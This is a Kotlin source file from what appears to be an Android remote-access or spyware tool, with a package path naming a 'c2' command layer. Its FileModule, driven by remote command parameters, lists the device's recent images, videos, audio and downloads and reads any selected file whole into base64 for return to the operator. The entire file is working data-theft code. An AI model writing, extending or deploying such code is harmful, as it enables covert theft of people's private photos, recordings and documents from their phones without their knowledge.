package org.synapse.core.modules

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import org.synapse.core.c2.Command
import org.synapse.core.core.FileEntry
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.InputStream

object FileModule {

    suspend fun list(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        val type = cmd.params["type"] ?: "images"
        val count = (cmd.params["count"] ?: "50").toIntOrNull() ?: 50

        val uri = when (type) {
            "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            "audio"  -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
            "downloads" -> MediaStore.Downloads.EXTERNAL_CONTENT_URI
            else -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.RELATIVE_PATH
        )

        val cursor: Cursor? = context.contentResolver.query(
            uri, projection, null, null,
            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
        )

        val files = mutableListOf<FileEntry>()
        cursor?.use {
            val idCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            val nameCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
            val sizeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
            val dateCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
            val pathCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)

            var i = 0
            while (it.moveToNext() && i < count) {
                files.add(FileEntry(
                    id = it.getLong(idCol).toString(),
                    name = it.getString(nameCol),
                    size = it.getLong(sizeCol),
                    date = it.getLong(dateCol),
                    path = it.getString(pathCol) ?: ""
                ))
                i++
            }
        }

        SynapseResponse.FileListResponse(entries = files)
    }

    suspend fun read(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        val fileId = cmd.params["id"]?.toLongOrNull()
        val fileType = cmd.params["type"] ?: "images"

        if (fileId == null) {
            return@withContext SynapseResponse.ErrorResponse(error = "missing_id", module = "files")
        }

        val uri = when (fileType) {
            "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            "audio"  -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
            else -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val contentUri = Uri.withAppendedPath(uri, fileId.toString())

        try {
            val input: InputStream? = context.contentResolver.openInputStream(contentUri)
            val bytes = input?.use { it.readBytes() } ?: ByteArray(0)
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

            val name = cmd.params["name"] ?: "unknown"
            val mimeType = context.contentResolver.getType(contentUri) ?: "application/octet-stream"

            SynapseResponse.FileReadResponse(
                file_id = fileId.toString(),
                mime_type = mimeType,
                size_bytes = bytes.size.toLong(),
                base64_data = b64
            )
        } catch (e: Exception) {
            SynapseResponse.ErrorResponse(error = "read:${e.message}", module = "files")
        }
    }
}
